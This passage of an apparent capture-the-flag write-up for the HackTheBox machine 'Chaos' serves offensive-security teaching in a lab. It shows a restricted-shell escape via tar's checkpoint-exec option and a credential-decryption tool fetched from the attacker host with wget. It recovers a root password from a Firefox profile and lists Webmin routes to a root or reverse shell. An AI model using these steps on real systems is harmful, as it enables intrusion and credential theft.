Using either [this Linux restricted shell bypass guide](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf) or [gtfobins](https://gtfobins.github.io/gtfobins/tar/) I’ll see that `tar` can break out of rbash.

```

www-data@chaos:/home$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@chaos:/home$ su - ayush
Password:
ayush@chaos:~$ tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
bash: groups: command not found
ayush@chaos:~$ cd ~
ayush@chaos:~$ ls
Command 'ls' is available in '/bin/ls'
The command could not be located because '/bin' is not included in the PATH environment variable.
ls: command not found
ayush@chaos:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
ayush@chaos:~$ ls
mail  user.txt

```

Now I have access to `user.txt`:

```

ayush@chaos:~$ cat user.txt
eef39126...

```

## Privesc: ayush –> root

### Enumeration

Looking around in ayush’’s home directory, I see the `.mozilla` directory:

```

ayush@chaos:~$ ls -la
total 40
drwx------ 6 ayush ayush 4096 May  8 06:57 .
drwxr-xr-x 4 root  root  4096 Oct 28  2018 ..
drwxr-xr-x 2 root  root  4096 Oct 28  2018 .app
-rw------- 1 root  root     0 Nov 24 23:57 .bash_history
-rw-r--r-- 1 ayush ayush  220 Oct 28  2018 .bash_logout
-rwxr-xr-x 1 root  root    22 Oct 28  2018 .bashrc
drwx------ 3 ayush ayush 4096 May  8 06:57 .gnupg
drwx------ 3 ayush ayush 4096 May  7 05:11 mail
drwx------ 4 ayush ayush 4096 Sep 29  2018 .mozilla
-rw-r--r-- 1 ayush ayush  807 Oct 28  2018 .profile
-rw------- 1 ayush ayush   33 Oct 28  2018 user.txt

```

Inside of it, there’s a single default profile, `bzo7sjt1.default`:

```

ayush@chaos:~/.mozilla$ find . -maxdepth 2
.
./firefox
./firefox/bzo7sjt1.default
./firefox/Crash Reports
./firefox/profiles.ini
./extensions

```

### Data Extraction from Firefox Profile

I’ll grab [this Firefox extraction tool](https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py), and upload it to target with `wget`:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.120 - - [08/May/2019 15:35:53] "GET /firefox_decrypt.py HTTP/1.1" 200 -

```

```

ayush@chaos:/dev/shm$ wget 10.10.14.14/firefox_decrypt.py
--2019-05-08 19:25:33--  http://10.10.14.14/firefox_decrypt.py
Connecting to 10.10.14.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 34618 (34K) [text/plain]
Saving to: ‘firefox_decrypt.py’

firefox_decrypt.py                                     100%[============================================================================================================================>]  33.81K  --.-KB/s    in 0.1s    

2019-05-08 19:25:34 (326 KB/s) - ‘firefox_decrypt.py’ saved [34618/34618]

```

When I run it, it immediately finds the profile, and prompts for a master password. Giving it the only password I know for ayush, “jiujitsu”, works:

```

ayush@chaos:/dev/shm$ python3 ff.py 

Master Password for profile /home/ayush/.mozilla/firefox/bzo7sjt1.default: 

Website:   https://chaos.htb:10000
Username: 'root'
Password: 'Thiv8wrej~'

```

I have the password that claims to be for the web service running on 10000. It also has username root.

The most obvious thing to try next is to see if this is a shared root password for the box. It is:

```

ayush@chaos:/dev/shm$ su
Password: 
root@chaos:/dev/shm#

```

And from there I can grab `root.txt`:

```

root@chaos:/dev/shm# cd /root/
root@chaos:~# ls
root.txt
root@chaos:~# cat root.txt 
4eca7e09...

```

## Beyond Root - Webmin

It turns out that the credentials from Firefox do work to get access to the Webmin page. Since I don’t remember another recent box that had an actual webmin login, I figured I’d look at what I could do with this access, in the case where the password was not shared with the system root account.

### Orientation

On logging in, I get a dashboard:

[![webmin](https://0xdfimages.gitlab.io/img/1557344771432.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1557344771432.png)

It’s interesting that right away my log-in is visible, so this is not an OPSEC safe thing to be doing.

### Methods to Shell

From this dashboard, there are *so* many ways to get a shell. It would be a fun game to see how many I could list, but I’ll start with three.

#### Command Shell

Clicking Others -> Command Shell loads an overlay with a root shell:

![1557345242276](https://0xdfimages.gitlab.io/img/1557345242276.png)

![1557345285314](https://0xdfimages.gitlab.io/img/1557345285314.png)

#### Change Password

It’s blunt, but under System -> Change Password, I can select the root account, and then set the password to whatever I want:

![1557345370097](https://0xdfimages.gitlab.io/img/1557345370097.png)

![1557345395264](https://0xdfimages.gitlab.io/img/1557345395264.png)

#### Cron

There’s a way to set a cron job under System -> Schedule Cron Jobs:

![1557345456339](https://0xdfimages.gitlab.io/img/1557345456339.png)

#### More

There’s so many more things to investigate (I haven’t tried these, but things to play with):
- System -> Filesystem Backup - Arbitrary file modification? (add to suderos, add root account to passwd or shadow, overwrite suid binary with reverse shell, etc..)
- System -> Scheduled Commands - Schedule reverse shell?
- Others -> Custom Commands - Add a command for a reverse shell?
- Others -> File Manager - Arbitrary file modification (same as earlier)?
- Others -> HTTP Tunnel - Access to local services?
- Others -> Java File Manager - Malicious java file upload?
- Others -> Perl Modules - Malicious Perl module?
- Others -> PHP Configuration - Malicious PHP module?
- Others -> Upload and Download - Arbitrary file modification (same as earlier)?

### Conclusion

At the end of the day, access to Webmin running as root is root access to the box. Still, it’s interesting to play with some of these, because there will be other websites that you may gain access to that only give you one of these things, and it’s worth thinking about how you might use it.